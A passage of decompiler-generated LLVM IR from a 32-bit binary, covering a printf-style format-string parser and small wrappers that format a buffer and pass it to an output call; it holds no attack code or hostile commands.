  %stack_var_8.131 = phi i8* [ %v22_8048982, %dec_label_pc_8048961 ], [ %stack_var_8.0.lcssa, %dec_label_pc_8048985.preheader ]
  %stack_var_-36.030 = phi i32 [ %v1_804897c, %dec_label_pc_8048961 ], [ 0, %dec_label_pc_8048985.preheader ]
  store i32 %v4_804898532, i32* %eax.global-to-local, align 4
  %v2_8048991 = load i8, i8* %stack_var_8.131, align 1
  %v3_8048991 = zext i8 %v2_8048991 to i32
  %v6_8048991 = or i32 %v3_8048991, %v5_804898833
  store i32 %v6_8048991, i32* %eax.global-to-local, align 4
  %tmp67 = icmp ult i8 %v2_8048991, 58
  br i1 %tmp67, label %dec_label_pc_8048961, label %dec_label_pc_8048997

dec_label_pc_8048997:                             ; preds = %dec_label_pc_8048961, %dec_label_pc_804898e, %dec_label_pc_8048985.preheader
  %stack_var_-36.0.lcssa = phi i32 [ 0, %dec_label_pc_8048985.preheader ], [ %stack_var_-36.030, %dec_label_pc_804898e ], [ %v1_804897c, %dec_label_pc_8048961 ]
  %stack_var_8.1.lcssa = phi i8* [ %stack_var_8.0.lcssa, %dec_label_pc_8048985.preheader ], [ %stack_var_8.131, %dec_label_pc_804898e ], [ %v22_8048982, %dec_label_pc_8048961 ]
  %v4_8048985.lcssa = phi i32 [ %v4_804898524, %dec_label_pc_8048985.preheader ], [ %v4_804898532, %dec_label_pc_804898e ], [ %v5_8048982, %dec_label_pc_8048961 ]
  %v5_8048988.lcssa = phi i32 [ %v5_804898827, %dec_label_pc_8048985.preheader ], [ %v5_804898833, %dec_label_pc_804898e ], [ %v5_8048988, %dec_label_pc_8048961 ]
  store i32 %v4_8048985.lcssa, i32* %eax.global-to-local, align 4
  %v2_804899a = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_804899a = zext i8 %v2_804899a to i32
  %v6_804899a = or i32 %v3_804899a, %v5_8048988.lcssa
  store i32 %v6_804899a, i32* %eax.global-to-local, align 4
  %v10_804899c = icmp eq i8 %v2_804899a, 115
  %v1_804899e = icmp eq i1 %v10_804899c, false
  br i1 %v1_804899e, label %dec_label_pc_80489e2, label %dec_label_pc_80489a0

dec_label_pc_80489a0:                             ; preds = %dec_label_pc_8048997
  store i32 %stack_var_12.150, i32* @edx, align 4
  %v1_80489a3 = add i32 %stack_var_12.150, 4
  store i32 %stack_var_12.150, i32* %eax.global-to-local, align 4
  %v1_80489ab = inttoptr i32 %stack_var_12.150 to i32*
  %v2_80489ab = load i32, i32* %v1_80489ab, align 4
  store i32 %v2_80489ab, i32* %eax.global-to-local, align 4
  %v4_80489b0 = icmp eq i32 %v2_80489ab, 0
  br i1 %v4_80489b0, label %dec_label_pc_80489c5, label %dec_label_pc_80489b6

dec_label_pc_80489b6:                             ; preds = %dec_label_pc_80489a0
  store i32 %v2_80489ab, i32* %eax.global-to-local, align 4
  %v5_80489b9 = inttoptr i32 %v2_80489ab to i8*
  br label %dec_label_pc_80489c5

dec_label_pc_80489c5:                             ; preds = %dec_label_pc_80489a0, %dec_label_pc_80489b6
  %storemerge = phi i8* [ %v5_80489b9, %dec_label_pc_80489b6 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8059ad8.24, i32 0, i32 0), %dec_label_pc_80489a0 ]
  %v4_80489c5 = ptrtoint i8* %storemerge to i32
  store i32 %v4_80489c5, i32* %eax.global-to-local, align 4
  %v5_80489c8 = add i32 %v0_8048b04, -4
  %v6_80489c8 = inttoptr i32 %v5_80489c8 to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_80489c8, align 4
  %v5_80489cb = add i32 %v0_8048b04, -8
  %v6_80489cb = inttoptr i32 %v5_80489cb to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_80489cb, align 4
  %v0_80489ce = load i32, i32* %eax.global-to-local, align 4
  %v2_80489ce = add i32 %v0_8048b04, -12
  %v3_80489ce = inttoptr i32 %v2_80489ce to i32*
  store i32 %v0_80489ce, i32* %v3_80489ce, align 4
  %v5_80489cf = add i32 %v0_8048b04, -16
  %v6_80489cf = inttoptr i32 %v5_80489cf to i32*
  store i32 %tmp3, i32* %v6_80489cf, align 4
  %v5_80489d2 = inttoptr i32 %stack_var_-36.0.lcssa to i8*
  %v6_80489d2 = call i32 @function_80486f5(i32 %v4_80489c5, i8* %v5_80489d2, i32 %stack_var_-32.0.lcssa, i32 %stack_var_-28.152)
  store i32 %v6_80489d2, i32* %eax.global-to-local, align 4
  %v0_80489d7 = load i32, i32* @esp, align 4
  %v1_80489d7 = add i32 %v0_80489d7, 16
  %v5_80489da = add i32 %v6_80489d2, %stack_var_-28.152
  br label %dec_label_pc_8048b16

dec_label_pc_80489e2:                             ; preds = %dec_label_pc_8048997
  store i32 %v4_8048985.lcssa, i32* %eax.global-to-local, align 4
  %v2_80489e5 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_80489e5 = zext i8 %v2_80489e5 to i32
  %v6_80489e5 = or i32 %v3_80489e5, %v5_8048988.lcssa
  store i32 %v6_80489e5, i32* %eax.global-to-local, align 4
  %v10_80489e7 = icmp eq i8 %v2_80489e5, 100
  %v1_80489e9 = icmp eq i1 %v10_80489e7, false
  br i1 %v1_80489e9, label %dec_label_pc_8048a1b, label %dec_label_pc_80489eb

dec_label_pc_80489eb:                             ; preds = %dec_label_pc_80489e2
  store i32 %stack_var_12.150, i32* @edx, align 4
  %v1_80489ee = add i32 %stack_var_12.150, 4
  store i32 %stack_var_12.150, i32* %eax.global-to-local, align 4
  %v1_80489f6 = inttoptr i32 %stack_var_12.150 to i32*
  %v2_80489f6 = load i32, i32* %v1_80489f6, align 4
  store i32 %v2_80489f6, i32* %eax.global-to-local, align 4
  %v1_80489fb = add i32 %v0_8048b04, -8
  %v2_80489fb = inttoptr i32 %v1_80489fb to i32*
  store i32 97, i32* %v2_80489fb, align 4
  %v5_80489fd = add i32 %v0_8048b04, -12
  %v6_80489fd = inttoptr i32 %v5_80489fd to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_80489fd, align 4
  %v5_8048a00 = add i32 %v0_8048b04, -16
  %v6_8048a00 = inttoptr i32 %v5_8048a00 to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_8048a00, align 4
  %v1_8048a03 = add i32 %v0_8048b04, -20
  %v2_8048a03 = inttoptr i32 %v1_8048a03 to i32*
  store i32 1, i32* %v2_8048a03, align 4
  %v1_8048a05 = add i32 %v0_8048b04, -24
  %v2_8048a05 = inttoptr i32 %v1_8048a05 to i32*
  store i32 10, i32* %v2_8048a05, align 4
  %v0_8048a07 = load i32, i32* %eax.global-to-local, align 4
  %v2_8048a07 = add i32 %v0_8048b04, -28
  %v3_8048a07 = inttoptr i32 %v2_8048a07 to i32*
  store i32 %v0_8048a07, i32* %v3_8048a07, align 4
  %v5_8048a08 = add i32 %v0_8048b04, -32
  %v6_8048a08 = inttoptr i32 %v5_8048a08 to i32*
  store i32 %tmp3, i32* %v6_8048a08, align 4
  %v1_8048a0b = call i32 @function_80487cc(i32 %v1_80489ee)
  store i32 %v1_8048a0b, i32* %eax.global-to-local, align 4
  %v0_8048a10 = load i32, i32* @esp, align 4
  %v1_8048a10 = add i32 %v0_8048a10, 32
  %v5_8048a13 = add i32 %v1_8048a0b, %stack_var_-28.152
  br label %dec_label_pc_8048b16

dec_label_pc_8048a1b:                             ; preds = %dec_label_pc_80489e2
  store i32 %v4_8048985.lcssa, i32* %eax.global-to-local, align 4
  %v2_8048a1e = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_8048a1e = zext i8 %v2_8048a1e to i32
  %v6_8048a1e = or i32 %v3_8048a1e, %v5_8048988.lcssa
  store i32 %v6_8048a1e, i32* %eax.global-to-local, align 4
  %v10_8048a20 = icmp eq i8 %v2_8048a1e, 120
  %v1_8048a22 = icmp eq i1 %v10_8048a20, false
  br i1 %v1_8048a22, label %dec_label_pc_8048a54, label %dec_label_pc_8048a24

dec_label_pc_8048a24:                             ; preds = %dec_label_pc_8048a1b
  store i32 %stack_var_12.150, i32* @edx, align 4
  %v1_8048a27 = add i32 %stack_var_12.150, 4
  store i32 %stack_var_12.150, i32* %eax.global-to-local, align 4
  %v1_8048a2f = inttoptr i32 %stack_var_12.150 to i32*
  %v2_8048a2f = load i32, i32* %v1_8048a2f, align 4
  store i32 %v2_8048a2f, i32* %eax.global-to-local, align 4
  %v1_8048a34 = add i32 %v0_8048b04, -8
  %v2_8048a34 = inttoptr i32 %v1_8048a34 to i32*
  store i32 97, i32* %v2_8048a34, align 4
  %v5_8048a36 = add i32 %v0_8048b04, -12
  %v6_8048a36 = inttoptr i32 %v5_8048a36 to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_8048a36, align 4
  %v5_8048a39 = add i32 %v0_8048b04, -16
  %v6_8048a39 = inttoptr i32 %v5_8048a39 to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_8048a39, align 4
  %v1_8048a3c = add i32 %v0_8048b04, -20
  %v2_8048a3c = inttoptr i32 %v1_8048a3c to i32*
  store i32 0, i32* %v2_8048a3c, align 4
  %v1_8048a3e = add i32 %v0_8048b04, -24
  %v2_8048a3e = inttoptr i32 %v1_8048a3e to i32*
  store i32 16, i32* %v2_8048a3e, align 4
  %v0_8048a40 = load i32, i32* %eax.global-to-local, align 4
  %v2_8048a40 = add i32 %v0_8048b04, -28
  %v3_8048a40 = inttoptr i32 %v2_8048a40 to i32*
  store i32 %v0_8048a40, i32* %v3_8048a40, align 4
  %v5_8048a41 = add i32 %v0_8048b04, -32
  %v6_8048a41 = inttoptr i32 %v5_8048a41 to i32*
  store i32 %tmp3, i32* %v6_8048a41, align 4
  %v1_8048a44 = call i32 @function_80487cc(i32 %v1_8048a27)
  store i32 %v1_8048a44, i32* %eax.global-to-local, align 4
  %v0_8048a49 = load i32, i32* @esp, align 4
  %v1_8048a49 = add i32 %v0_8048a49, 32
  %v5_8048a4c = add i32 %v1_8048a44, %stack_var_-28.152
  br label %dec_label_pc_8048b16

dec_label_pc_8048a54:                             ; preds = %dec_label_pc_8048a1b
  store i32 %v4_8048985.lcssa, i32* %eax.global-to-local, align 4
  %v2_8048a57 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_8048a57 = zext i8 %v2_8048a57 to i32
  %v6_8048a57 = or i32 %v3_8048a57, %v5_8048988.lcssa
  store i32 %v6_8048a57, i32* %eax.global-to-local, align 4
  %v10_8048a59 = icmp eq i8 %v2_8048a57, 88
  %v1_8048a5b = icmp eq i1 %v10_8048a59, false
  br i1 %v1_8048a5b, label %dec_label_pc_8048a8d, label %dec_label_pc_8048a5d

dec_label_pc_8048a5d:                             ; preds = %dec_label_pc_8048a54
  store i32 %stack_var_12.150, i32* @edx, align 4
  %v1_8048a60 = add i32 %stack_var_12.150, 4
  store i32 %stack_var_12.150, i32* %eax.global-to-local, align 4
  %v1_8048a68 = inttoptr i32 %stack_var_12.150 to i32*
  %v2_8048a68 = load i32, i32* %v1_8048a68, align 4
  store i32 %v2_8048a68, i32* %eax.global-to-local, align 4
  %v1_8048a6d = add i32 %v0_8048b04, -8
  %v2_8048a6d = inttoptr i32 %v1_8048a6d to i32*
  store i32 65, i32* %v2_8048a6d, align 4
  %v5_8048a6f = add i32 %v0_8048b04, -12
  %v6_8048a6f = inttoptr i32 %v5_8048a6f to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_8048a6f, align 4
  %v5_8048a72 = add i32 %v0_8048b04, -16
  %v6_8048a72 = inttoptr i32 %v5_8048a72 to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_8048a72, align 4
  %v1_8048a75 = add i32 %v0_8048b04, -20
  %v2_8048a75 = inttoptr i32 %v1_8048a75 to i32*
  store i32 0, i32* %v2_8048a75, align 4
  %v1_8048a77 = add i32 %v0_8048b04, -24
  %v2_8048a77 = inttoptr i32 %v1_8048a77 to i32*
  store i32 16, i32* %v2_8048a77, align 4
  %v0_8048a79 = load i32, i32* %eax.global-to-local, align 4
  %v2_8048a79 = add i32 %v0_8048b04, -28
  %v3_8048a79 = inttoptr i32 %v2_8048a79 to i32*
  store i32 %v0_8048a79, i32* %v3_8048a79, align 4
  %v5_8048a7a = add i32 %v0_8048b04, -32
  %v6_8048a7a = inttoptr i32 %v5_8048a7a to i32*
  store i32 %tmp3, i32* %v6_8048a7a, align 4
  %v1_8048a7d = call i32 @function_80487cc(i32 %v1_8048a60)
  store i32 %v1_8048a7d, i32* %eax.global-to-local, align 4
  %v0_8048a82 = load i32, i32* @esp, align 4
  %v1_8048a82 = add i32 %v0_8048a82, 32
  %v5_8048a85 = add i32 %v1_8048a7d, %stack_var_-28.152
  br label %dec_label_pc_8048b16

dec_label_pc_8048a8d:                             ; preds = %dec_label_pc_8048a54
  store i32 %v4_8048985.lcssa, i32* %eax.global-to-local, align 4
  %v2_8048a90 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_8048a90 = zext i8 %v2_8048a90 to i32
  %v6_8048a90 = or i32 %v3_8048a90, %v5_8048988.lcssa
  store i32 %v6_8048a90, i32* %eax.global-to-local, align 4
  %v10_8048a92 = icmp eq i8 %v2_8048a90, 117
  %v1_8048a94 = icmp eq i1 %v10_8048a92, false
  br i1 %v1_8048a94, label %dec_label_pc_8048ac3, label %dec_label_pc_8048a96

dec_label_pc_8048a96:                             ; preds = %dec_label_pc_8048a8d
  store i32 %stack_var_12.150, i32* @edx, align 4
  %v1_8048a99 = add i32 %stack_var_12.150, 4
  store i32 %stack_var_12.150, i32* %eax.global-to-local, align 4
  %v1_8048aa1 = inttoptr i32 %stack_var_12.150 to i32*
  %v2_8048aa1 = load i32, i32* %v1_8048aa1, align 4
  store i32 %v2_8048aa1, i32* %eax.global-to-local, align 4
  %v1_8048aa6 = add i32 %v0_8048b04, -8
  %v2_8048aa6 = inttoptr i32 %v1_8048aa6 to i32*
  store i32 97, i32* %v2_8048aa6, align 4
  %v5_8048aa8 = add i32 %v0_8048b04, -12
  %v6_8048aa8 = inttoptr i32 %v5_8048aa8 to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_8048aa8, align 4
  %v5_8048aab = add i32 %v0_8048b04, -16
  %v6_8048aab = inttoptr i32 %v5_8048aab to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_8048aab, align 4
  %v1_8048aae = add i32 %v0_8048b04, -20
  %v2_8048aae = inttoptr i32 %v1_8048aae to i32*
  store i32 0, i32* %v2_8048aae, align 4
  %v1_8048ab0 = add i32 %v0_8048b04, -24
  %v2_8048ab0 = inttoptr i32 %v1_8048ab0 to i32*
  store i32 10, i32* %v2_8048ab0, align 4
  %v0_8048ab2 = load i32, i32* %eax.global-to-local, align 4
  %v2_8048ab2 = add i32 %v0_8048b04, -28
  %v3_8048ab2 = inttoptr i32 %v2_8048ab2 to i32*
  store i32 %v0_8048ab2, i32* %v3_8048ab2, align 4
  %v5_8048ab3 = add i32 %v0_8048b04, -32
  %v6_8048ab3 = inttoptr i32 %v5_8048ab3 to i32*
  store i32 %tmp3, i32* %v6_8048ab3, align 4
  %v1_8048ab6 = call i32 @function_80487cc(i32 %v1_8048a99)
  store i32 %v1_8048ab6, i32* %eax.global-to-local, align 4
  %v0_8048abb = load i32, i32* @esp, align 4
  %v1_8048abb = add i32 %v0_8048abb, 32
  %v5_8048abe = add i32 %v1_8048ab6, %stack_var_-28.152
  br label %dec_label_pc_8048b16

dec_label_pc_8048ac3:                             ; preds = %dec_label_pc_8048a8d
  store i32 %v4_8048985.lcssa, i32* %eax.global-to-local, align 4
  %v2_8048ac6 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_8048ac6 = zext i8 %v2_8048ac6 to i32
  %v6_8048ac6 = or i32 %v3_8048ac6, %v5_8048988.lcssa
  store i32 %v6_8048ac6, i32* %eax.global-to-local, align 4
  %v10_8048ac8 = icmp eq i8 %v2_8048ac6, 99
  %v1_8048aca = icmp eq i1 %v10_8048ac8, false
  br i1 %v1_8048aca, label %dec_label_pc_8048b16, label %dec_label_pc_8048acc

dec_label_pc_8048acc:                             ; preds = %dec_label_pc_8048ac3
  store i32 %stack_var_12.150, i32* @edx, align 4
  %v1_8048acf = add i32 %stack_var_12.150, 4
  store i32 %stack_var_12.150, i32* %eax.global-to-local, align 4
  %v1_8048ad7 = inttoptr i32 %stack_var_12.150 to i32*
  %v2_8048ad7 = load i32, i32* %v1_8048ad7, align 4
  store i32 %v2_8048ad7, i32* %stack_var_-6, align 4
  %v5_8048ae0 = add i32 %v0_8048b04, -4
  %v6_8048ae0 = inttoptr i32 %v5_8048ae0 to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_8048ae0, align 4
  %v5_8048ae3 = add i32 %v0_8048b04, -8
  %v6_8048ae3 = inttoptr i32 %v5_8048ae3 to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_8048ae3, align 4
  store i32 %v2_8048ae6, i32* %eax.global-to-local, align 4
  %v2_8048ae9 = add i32 %v0_8048b04, -12
  %v3_8048ae9 = inttoptr i32 %v2_8048ae9 to i32*
  store i32 %v2_8048ae6, i32* %v3_8048ae9, align 4
  %v5_8048aea = add i32 %v0_8048b04, -16
  %v6_8048aea = inttoptr i32 %v5_8048aea to i32*
  store i32 %tmp3, i32* %v6_8048aea, align 4
  %v0_8048aed = load i32, i32* %stack_var_-6, align 4
  %v6_8048aed = call i32 @function_80486f5(i32 %v0_8048aed, i8* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_8048aed, i32* %eax.global-to-local, align 4
  %v0_8048af2 = load i32, i32* @esp, align 4
  %v1_8048af2 = add i32 %v0_8048af2, 16
  %v5_8048af5 = add i32 %v6_8048aed, %stack_var_-28.152
  br label %dec_label_pc_8048b16

dec_label_pc_8048afa:                             ; preds = %dec_label_pc_804892d, %dec_label_pc_8048903
  %stack_var_8.2 = phi i8* [ %stack_var_8.453, %dec_label_pc_8048903 ], [ %v22_8048910, %dec_label_pc_804892d ]
  %v4_8048afa = ptrtoint i8* %stack_var_8.2 to i32
  store i32 %v4_8048afa, i32* %eax.global-to-local, align 4
  %v2_8048afd = load i8, i8* %stack_var_8.2, align 1
  %v3_8048afd = zext i8 %v2_8048afd to i32
  store i32 %v3_8048afd, i32* %eax.global-to-local, align 4
  %v2_8048b07 = add i32 %v0_8048b04, -12
  %v3_8048b07 = inttoptr i32 %v2_8048b07 to i32*
  store i32 %v3_8048afd, i32* %v3_8048b07, align 4
  %v5_8048b08 = add i32 %v0_8048b04, -16
  %v6_8048b08 = inttoptr i32 %v5_8048b08 to i32*
  store i32 %tmp3, i32* %v6_8048b08, align 4
  %v2_8048b0b = inttoptr i32 %stack_var_-28.152 to i32*
  %v3_8048b0b = call i32 @function_80486bb(i32* %v2_8048b0b, i32 %stack_var_-24.149)
  store i32 %v3_8048b0b, i32* %eax.global-to-local, align 4
  %v0_8048b10 = load i32, i32* @esp, align 4
  %v1_8048b10 = add i32 %v0_8048b10, 16
  %v4_8048b13 = add i32 %stack_var_-28.152, 1
  br label %dec_label_pc_8048b16

dec_label_pc_8048b16:                             ; preds = %dec_label_pc_8048ac3, %dec_label_pc_8048acc, %dec_label_pc_8048a96, %dec_label_pc_8048a5d, %dec_label_pc_8048a24, %dec_label_pc_80489eb, %dec_label_pc_80489c5, %dec_label_pc_8048afa
  %v4_80489c864 = phi i32 [ %v1_8048b10, %dec_label_pc_8048afa ], [ %v0_8048b04, %dec_label_pc_8048ac3 ], [ %v1_8048af2, %dec_label_pc_8048acc ], [ %v1_8048abb, %dec_label_pc_8048a96 ], [ %v1_8048a82, %dec_label_pc_8048a5d ], [ %v1_8048a49, %dec_label_pc_8048a24 ], [ %v1_8048a10, %dec_label_pc_80489eb ], [ %v1_80489d7, %dec_label_pc_80489c5 ]
  %stack_var_-24.0 = phi i32 [ %stack_var_-24.149, %dec_label_pc_8048afa ], [ %stack_var_-24.149, %dec_label_pc_8048ac3 ], [ %stack_var_-24.149, %dec_label_pc_8048acc ], [ %stack_var_-24.149, %dec_label_pc_8048a96 ], [ %stack_var_-24.149, %dec_label_pc_8048a5d ], [ %stack_var_-24.149, %dec_label_pc_8048a24 ], [ %stack_var_-24.149, %dec_label_pc_80489eb ], [ %v2_80489ab, %dec_label_pc_80489c5 ]
  %stack_var_12.0 = phi i32 [ %stack_var_12.150, %dec_label_pc_8048afa ], [ %stack_var_12.150, %dec_label_pc_8048ac3 ], [ %v1_8048acf, %dec_label_pc_8048acc ], [ %v1_8048a99, %dec_label_pc_8048a96 ], [ %v1_8048a60, %dec_label_pc_8048a5d ], [ %v1_8048a27, %dec_label_pc_8048a24 ], [ %v1_80489ee, %dec_label_pc_80489eb ], [ %v1_80489a3, %dec_label_pc_80489c5 ]
  %stack_var_8.3 = phi i8* [ %stack_var_8.2, %dec_label_pc_8048afa ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048ac3 ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048acc ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048a96 ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048a5d ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048a24 ], [ %stack_var_8.1.lcssa, %dec_label_pc_80489eb ], [ %stack_var_8.1.lcssa, %dec_label_pc_80489c5 ]
  %stack_var_-28.0 = phi i32 [ %v4_8048b13, %dec_label_pc_8048afa ], [ %stack_var_-28.152, %dec_label_pc_8048ac3 ], [ %v5_8048af5, %dec_label_pc_8048acc ], [ %v5_8048abe, %dec_label_pc_8048a96 ], [ %v5_8048a85, %dec_label_pc_8048a5d ], [ %v5_8048a4c, %dec_label_pc_8048a24 ], [ %v5_8048a13, %dec_label_pc_80489eb ], [ %v5_80489da, %dec_label_pc_80489c5 ]
  %v4_8048b16 = ptrtoint i8* %stack_var_8.3 to i32
  %v5_8048b16 = add i32 %v4_8048b16, 1
  %stack_var_8.4 = inttoptr i32 %v5_8048b16 to i8*
  store i32 %v5_8048b16, i32* %eax.global-to-local, align 4
  %v2_8048b1c = load i8, i8* %stack_var_8.4, align 1
  %v3_8048b1c = zext i8 %v2_8048b1c to i32
  %v5_8048b1c = and i32 %v5_8048b16, -256
  %v6_8048b1c = or i32 %v3_8048b1c, %v5_8048b1c
  store i32 %v6_8048b1c, i32* %eax.global-to-local, align 4
  %v4_8048b1e = icmp eq i8 %v2_8048b1c, 0
  %v1_8048b20 = icmp eq i1 %v4_8048b1e, false
  br i1 %v1_8048b20, label %dec_label_pc_8048903, label %dec_label_pc_8048b26

dec_label_pc_8048b26:                             ; preds = %dec_label_pc_8048b16, %dec_label_pc_8048910, %dec_label_pc_80488f1
  %stack_var_-28.1.lcssa = phi i32 [ 0, %dec_label_pc_80488f1 ], [ %stack_var_-28.152, %dec_label_pc_8048910 ], [ %stack_var_-28.0, %dec_label_pc_8048b16 ]
  %v4_8048b26 = icmp eq i32* %arg1, null
  br i1 %v4_8048b26, label %dec_label_pc_8048b34, label %dec_label_pc_8048b2c

dec_label_pc_8048b2c:                             ; preds = %dec_label_pc_8048b26
  store i32 %tmp3, i32* %eax.global-to-local, align 4
  %v2_8048b2f = load i32, i32* %arg1, align 4
  store i32 %v2_8048b2f, i32* %eax.global-to-local, align 4
  %v1_8048b31 = inttoptr i32 %v2_8048b2f to i8*
  store i8 0, i8* %v1_8048b31, align 1
  br label %dec_label_pc_8048b34

dec_label_pc_8048b34:                             ; preds = %dec_label_pc_8048b26, %dec_label_pc_8048b2c
  store i32 %stack_var_-28.1.lcssa, i32* %eax.global-to-local, align 4
  %v2_8048b37 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8048b37, i32* @ebp, align 4
  ret i32 %stack_var_-28.1.lcssa

; uselistorder directives
  uselistorder i32 %v5_8048b1c, { 1, 0 }
  uselistorder i8* %stack_var_8.4, { 1, 0 }
  uselistorder i32 %v5_8048b16, { 3, 2, 1, 0 }
  uselistorder i8* %stack_var_8.2, { 0, 2, 1 }
  uselistorder i32 %v2_80489ab, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v5_8048988.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_8048985.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8* %stack_var_8.1.lcssa, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-36.0.lcssa, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %stack_var_-32.0.lcssa, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_804894f, { 1, 2, 3, 0 }
  uselistorder i8* %v22_8048910, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_-24.149, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_12.150, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32 %stack_var_8.4.in51, { 2, 1, 0 }
  uselistorder i32 %stack_var_-28.152, { 0, 3, 2, 1, 10, 9, 8, 7, 6, 5, 4 }
  uselistorder i32 %v0_8048b04, { 38, 1, 0, 5, 4, 3, 2, 12, 11, 10, 9, 8, 7, 6, 19, 18, 17, 16, 15, 14, 13, 26, 25, 24, 23, 22, 21, 20, 33, 32, 31, 30, 29, 28, 27, 37, 36, 35, 34 }
  uselistorder i32 %tmp3, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 6, 7, 8, 64, 65, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 50, 51, 52, 53, 49, 2, 1, 54, 55, 0, 3, 56, 57, 58, 59, 60, 61, 62, 63, 5, 4 }
  uselistorder i32 (i32*, i32)* @function_80486bb, { 4, 0, 1, 2, 3 }
  uselistorder i32 (i32)* @function_80487cc, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i8*, i32, i32)* @function_80486f5, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8048b34, { 1, 0 }
  uselistorder label %dec_label_pc_8048b16, { 7, 1, 0, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_80489c5, { 1, 0 }
  uselistorder label %dec_label_pc_8048997, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804898e, { 1, 0 }
  uselistorder label %dec_label_pc_804894f, { 1, 0 }
  uselistorder label %dec_label_pc_8048903, { 1, 0 }
}

define i32 @function_8048b39(i32 %arg1) local_unnamed_addr {
dec_label_pc_8048b39:
  %stack_var_8 = alloca i32, align 4
  %v4_8048b42 = ptrtoint i32* %stack_var_8 to i32
  %v4_8048b51 = call i32 @function_80488f1(i32* null, i32 %arg1, i32 %v4_8048b42)
  ret i32 %v4_8048b51
}

define i32 @function_8048b5b(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8048b5b:
  %stack_var_4 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %v4_8048b64 = ptrtoint i32* %stack_var_12 to i32
  %v4_8048b75 = call i32 @function_80488f1(i32* nonnull %stack_var_4, i32 %arg1, i32 %v4_8048b64)
  ret i32 %v4_8048b75
}

define i32 @function_8048b7f(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8048b7f:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %v0_8048b82 = load i32, i32* @edi, align 4
  %v1_8048b8e = call i32 @function_8051f6a(i32 2048)
  store i32 %v1_8048b8e, i32* %stack_var_-20, align 4
  %v3_8048baa = inttoptr i32 %v1_8048b8e to i8*
  %v4_8048baa = call i32 @function_805143c(i8* %v3_8048baa, i32 0, i32 2048)
  %v4_8048bbb = ptrtoint i32* %stack_var_12 to i32
  %v4_8048bcd = call i32 @function_80488f1(i32* nonnull %stack_var_-20, i32 %arg2, i32 %v4_8048bbb)
  %v3_8048be6 = call i32 @_strlen(i8* %v3_8048baa)
  %v6_8048bed = add i32 %v3_8048be6, %v1_8048b8e
  %v1_8048bf0 = inttoptr i32 %v6_8048bed to i8*
  store i8 10, i8* %v1_8048bf0, align 1
  store i1 false, i1* @df, align 1
  store i32 %v1_8048b8e, i32* @edi, align 4
  %v3_8048c04 = call i32 @_strlen(i8* %v3_8048baa)
  %v4_8048c17 = call i32 @function_8051d08(i32 %arg1, i32 %v1_8048b8e, i32 %v3_8048c04, i32 16384)
  %v1_8048c28 = call i32 @function_8052915(i32 %v1_8048b8e)
  store i32 %v0_8048b82, i32* @edi, align 4
  ret i32 %v4_8048c17

; uselistorder directives
  uselistorder i32 %v1_8048b8e, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @function_8048c38(i32 %arg1, i8* %arg2) local_unnamed_addr {
dec_label_pc_8048c38:
  %tmp15 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %v4_8048c3f = ptrtoint i8* %arg2 to i32
  %v2_8048c42 = load i8, i8* %arg2, align 1
  %v10_8048c44 = icmp eq i8 %v2_8048c42, 114
  br i1 %v10_8048c44, label %dec_label_pc_8048c51, label %dec_label_pc_8048c48

dec_label_pc_8048c48:                             ; preds = %dec_label_pc_8048c38
  %v2_8048c4b = load i8, i8* %arg2, align 1
  %v10_8048c4d = icmp eq i8 %v2_8048c4b, 119
  %v1_8048c4f = icmp eq i1 %v10_8048c4d, false
  br i1 %v1_8048c4f, label %dec_label_pc_8048e26, label %dec_label_pc_8048c51

